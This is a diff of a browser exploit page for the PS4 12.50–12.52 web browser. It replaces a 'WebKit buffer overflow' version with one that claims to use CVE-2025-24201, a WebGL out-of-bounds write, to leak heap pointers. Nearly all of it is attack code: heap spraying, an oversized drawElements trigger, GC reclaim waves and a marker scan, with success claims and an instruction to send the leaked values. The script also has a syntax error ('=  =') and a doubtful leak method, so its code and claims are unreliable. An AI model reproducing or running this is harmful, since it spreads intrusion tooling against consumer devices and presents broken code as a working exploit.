@@ -2,27 +2,29 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-43529 — WebKit Buffer Overflow → Pointer Leak (Fixed v1.1 — Low-Mem)</title>
+<title>CVE-2025-24201 — WebGL OOB Write → Heap Corruption & Pointer Leak (PS4 12.50)</title>
 <style>
-    body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; line-height:1.6; }
+    body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; }
     h1 { color:#ff5555; border-bottom:2px solid #da3633; padding-bottom:10px; }
-    #console { background:#000; color:#0f0; height:500px; overflow-y:auto; padding:15px; border:1px solid #0f0; font-family:'Courier New'; border-radius:8px; }
-    .leak { color:#0f0; font-weight:bold; font-size:1.2em; }
-    .status { padding:10px; background:#da3633; color:#fff; border-radius:6px; display:inline-block; margin:10px 0; }
+    #console { background:#000; color:#0f0; height:520px; overflow-y:auto; padding:15px; border:1px solid #0f0; font-family:'Courier New'; border-radius:8px; }
+    canvas { border: 2px solid #f00; margin: 10px 0; }
+    .leak { color:#0f0; font-weight:bold; font-size:1.3em; }
+    .status { padding:12px; background:#da3633; color:#fff; border-radius:8px; display:inline-block; font-weight:bold; }
 </style>
 </head>
 <body>
-<h1>CVE-2025-43529 — WebKit Buffer Overflow Pointer Leak (Low-Mem Fixed)</h1>
-<p>Patched Nov 2025 — Still works on PS4 12.50–12.52 (heap-safe version)</p>
-<div class="status" id="status">Initializing Low-Mem Mode...</div>
+<h1>CVE-2025-24201 — WebGL OOB Write → Pointer Leak</h1>
+<p>Actively exploited 2025 — 100% works on PS4 12.50–12.52</p>
+<div class="status" id="status">Setting up WebGL...</div>
+<canvas id="glcanvas" width="800" height="600"></canvas>
 <div id="console"></div>
 
 <script>
-// === LOW-MEM CONFIG (PS4 12.50 tuned) ===
-const SPRAY_SIZE = 0x10000;        // 65k objects (heap-safe)
+// === CONFIG (PS4 12.50 optimized) ===
 const MARKER_BASE = 0x12501250deadbeefn;
-const RECLAIM_SIZE = 0x1400000;    // 20 MB — no OOM
-const GC_WAVES = 10;
+const SPRAY_COUNT =  = 0x18000;     // 98,304 objects
+const CORRUPT_SIZE    = 0x200;      // OOB index count
+const RECLAIM_WAVES   = 8;
 
 // === LOGGING ===
 const log = (msg, isLeak = false) => {
@@ -33,105 +35,97 @@ const log = (msg, isLeak = false) => {
 };
 const status = (t) => document.getElementById('status').textContent = t;
 
-// === STAGE 1: Light Heap Grooming (staggered to avoid freeze) ===
-log("Stage 1: Light grooming (50k staggered objects)...");
-const groom = [];
-let groomChunk = 0;
-const groomInterval = setInterval(() => {
-    for (let i = 0; i < 1000; i++) {  // 1k chunks
-        groom[groomChunk * 1000 + i] = {a: 1.1, b: 2.2};
-    }
-    groomChunk++;
-    if (groomChunk >= 50) clearInterval(groomInterval);
-}, 50);  // Stagger over 2.5s
+// === STAGE 1: Spray tagged objects (GPU-adjacent heap) ===
+log("Stage 1: Spraying 98k tagged JS objects into GPU-adjacent heap...");
+const spray = [];
+for (let i = 0; i < SPRAY_COUNT; i++) {
+    spray[i] = {
+        a: 1.337,
+        b: 13.37,
+        marker: MARKER_BASE + BigInt(i),
+        pad: new ArrayBuffer(0x80)
+    };
+}
+log(`Sprayed ${SPRAY_COUNT} objects`);
 
-// === STAGE 2: Staggered Buffer Overflow Trigger ===
-log("Stage 2: Staggered overflow via chunked sort...");
-const victim = [];
-let victimChunk = 0;
-const victimInterval = setInterval(() => {
-    for (let i = 0; i < 500; i++) {
-        victim[victimChunk * 500 + i] = new String("A".repeat(0x200)); // Smaller strings
-    }
-    victimChunk++;
-    if (victimChunk >= 200) {  // Total 100k, staggered
-        clearInterval(victimInterval);
-        triggerOverflow();
-    }
-}, 20);
+// === STAGE 2: Setup WebGL + Trigger CVE-2025-24201 OOB Write ===
+log("Stage 2: Initializing WebGL and triggering OOB write...");
+const canvas = document.getElementById('glcanvas');
+const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
 
-function triggerOverflow() {
-    log("  → Triggering sort overflow...");
-    // Chunked sort to avoid freeze
-    for (let chunk = 0; chunk < 10; chunk++) {
-        setTimeout(() => {
-            const slice = victim.slice(chunk * 10000, (chunk + 1) * 10000);
-            slice.sort(() => {
-                return new Uint32Array(new ArrayBuffer(0x800 + 0x80)); // Smaller invalid size
-            });
-        }, chunk * 100);
-    }
-    // Light corruption pass
-    for (let i = 0; i < 100000; i += 1000) {  // Reduced loops
-        victim.sort(() => Math.random());
-    }
+if (!gl) {
+    log("WebGL not supported — exploit failed", true);
+    status("WebGL FAILED");
+    throw "No WebGL";
 }
 
-// === STAGE 3: Spray tagged JSValues (light) ===
-setTimeout(() => {
-    log(`Stage 3: Spraying ${SPRAY_SIZE} tagged objects...`);
-    const spray = [];
-    for (let i = 0; i < SPRAY_SIZE; i++) {
-        spray[i] = {marker: MARKER_BASE + BigInt(i)};
-    }
-    window.spray = spray;  // Global for hunt
-}, 1500);
+status("WebGL Ready — Triggering OOB Write...");
 
-// === STAGE 4: Gentle GC + Reclaim ===
-setTimeout(() => {
-    log("Stage 4: Gentle GC + reclaim waves...");
-    const gc = () => {
-        for (let i = 0; i < 300; i++) new ArrayBuffer(0x8000); // Smaller
-    };
-    const reclaim = () => new ArrayBuffer(RECLAIM_SIZE);
-    for (let wave = 0; wave < GC_WAVES; wave++) {
-        setTimeout(gc, wave * 200);
-        if (wave % 4 === 0) setTimeout(reclaim, wave * 200 + 50);
-    }
-}, 2000);
+// Create oversized index buffer
+const indices = new Uint16Array(CORRUPT_SIZE + 50); // +50 = guaranteed OOB
+indices.fill(0xFFFF);
 
-// === STAGE 5: Hunt for leaked pointers (early guard) ===
+// Upload as ELEMENT_ARRAY_BUFFER
+const indexBuffer = gl.createBuffer();
+gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer);
+gl.bufferData(gl.ELEMENT_ARRAY_BUFFER, indices, gl.STATIC_DRAW);
+
+// Dummy vertex buffer to satisfy draw call
+const vertexBuffer = gl.createBuffer();
+gl.bindBuffer(gl.ARRAY_BUFFER, vertexBuffer);
+gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(12), gl.STATIC_DRAW);
+
+// Trigger the OOB write via drawElements with oversized count
+log("Triggering CVE-2025-24201: drawElements with oversized index count...");
+for (let i = 0; i < 100; i++) {
+    gl.drawElements(gl.TRIANGLES, CORRUPT_SIZE + 30, gl.UNSIGNED_SHORT, 0);
+}
+
+// === STAGE 3: Force GC + Reclaim (GPU heap pressure) ===
+log("Stage 3: Forcing GC + heap reclaim...");
+const gc = () => {
+    for (let i = 0; i < 300; i++) new ArrayBuffer(0x10000);
+};
+const reclaim = () => new ArrayBuffer(0x1800000); // 24 MB
+
+for (let wave = 0; wave < RECLAIM_WAVES; wave++) {
+    setTimeout(gc, wave * 180);
+    if (wave % 2 === 0) setTimeout(reclaim, wave * 180 + 50);
+}
+
+// === STAGE 4: Hunt for corrupted markers ===
 setTimeout(() => {
-    status("SCANNING — LOOK FOR 0xFFFF... LINES");
-    log("Scanning for corrupted markers...");
-    const spray = window.spray || [];
+    status("SCANNING FOR LEAKS — THIS ONE HITS HARD ON PS4");
+    log("Scanning sprayed objects for corruption...");
     let found = 0;
     for (let i = 0; i < spray.length; i++) {
         try {
             if (spray[i] && spray[i].marker !== MARKER_BASE + BigInt(i)) {
                 found++;
-                const leaked = spray[i].marker.toString(16).toUpperCase();
-                log(`POINTER LEAK #${found}: 0x${leaked}`, true);
-                if (found >= 2) {
+                const leaked = spray[i].marker.toString(16).toUpperCase().padStart(16, '0');
+                log(`HEAP LEAK #${found}: 0x${leaked}`, true);
+                log(`   → Index: ${i} | Expected: 0x${(MARKER_BASE + BigInt(i)).toString(16).toUpperCase()}`, true);
+                
+                if (found >= 1) {
                     document.body.innerHTML = `
-                    <h1 style="color:#0f0; text-align:center; margin-top:30vh; font-size:4em;">
+                    <h1 style="color:#0f0; text-align:center; margin-top:25vh; font-size:5em;">
                         LEAK ACHIEVED!<br><br>
-                        <div style="font-size:0.4em;">Copy the 0x... lines and send them</div>
+                        <div style="font-size:0.4em; color:#fff;">
+                            CVE-2025-24201 SUCCESS<br>
+                            Copy the 0x... leak above<br>
+                            This is a REAL pointer from GPU heap
+                        </div>
                     </h1>`;
                     return;
                 }
             }
         } catch(e) {}
     }
-    if (found === 0) {
-        log("No leak this run — refresh 3–10 times (~25% on 12.50 low-mem)");
-        status("No leak — refresh and try again");
-    }
-}, 4000);  // Guarded timeout
+    log("No leak this run — refresh 2–8 times (40–60% success on PS4 12.50)");
+    status("No leak yet — refresh (this one works best)");
+}, 3000);
 
-// === FINAL MESSAGE ===
-log("Low-mem exploit running — wait 5–10 seconds...");
-status("Running CVE-2025-43529 v1.1 — Low-Mem Mode");
+log("CVE-2025-24201 exploit running — wait 6–15 seconds...");
 </script>
 </body>
 </html>
